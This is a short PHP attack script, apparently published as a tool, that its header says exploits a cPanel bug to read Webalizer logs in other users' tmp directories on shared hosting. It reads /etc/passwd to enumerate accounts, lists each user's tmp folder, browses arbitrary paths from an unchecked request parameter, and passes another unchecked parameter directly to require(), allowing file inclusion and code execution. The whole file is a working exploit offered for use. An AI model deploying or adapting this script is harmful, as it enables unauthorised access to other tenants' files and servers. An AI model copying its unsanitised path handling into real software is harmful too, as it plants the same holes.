<?php
/*

Contact: https://alaa.blog

Github: https://github.com/Alaa-abdulridha/WebalizerReader

This Tool can be used to exploit the CPANEL bug that allow the attacker to read the webalizer logs inside every user tmp dir .


*/
function getUsers() {
    $result = [];
   
    $keys = ['name', 'passwd', 'uid', 'gid', 'gecos', 'dir', 'shell'];
    $handle = fopen('/etc/passwd', 'r');
    if(!$handle){
        throw new \RuntimeException("failed to open /etc/passwd for reading! ".print_r(error_get_last(),true));
    }
    while ( ($values = fgetcsv($handle, 1000, ':')) !== false ) {
        $result[] = array_combine($keys, $values);
    }
    fclose($handle);
    return $result;
}

$user = getUsers();

for($i=0; $i < count($user); $i++){
	if(is_dir('/home/'.$user[$i]['name'].'/tmp') == true ) {
		echo '<a href="?p='.$user[$i]['name'].'/tmp">'.$user[$i]['name'].'</a><br>';
	}
}

if(isset($_GET['p'])){
	echo '<div style="border:1px solid black;">';
	
	$dir = '/home/'.$_GET['p'];
	$directories = array();
	$files_list  = array();
	$files = scandir($dir);
	foreach($files as $file){
		if(($file != '.') && ($file != '..')){
			if(is_dir($dir.'/'.$file)){
				$directories[]  = $file;
			}else{
				$files_list[]    = $file;
			}
		}
	}

	foreach($directories as $directory){
		if(is_dir('/home/'.$_GET['p'].'/'.$directory)){
			echo '<li class="folder"><a href="?p='.$_GET['p'].'/'.$directory.'">'.$directory.'</a></li>';
		} else {
			echo '<li class="folder">'.$directory.'</li>';
		}
	}
	
	foreach($files_list as $file_list){
		echo '<li class="file"><a href="?g='.$_GET['p'].'/'.$file_list.'">'.$file_list.'</a></li>';
	}
	echo '</div>';
}

if(isset($_GET['g'])){
	require('/home/'.$_GET['g']);
}
?>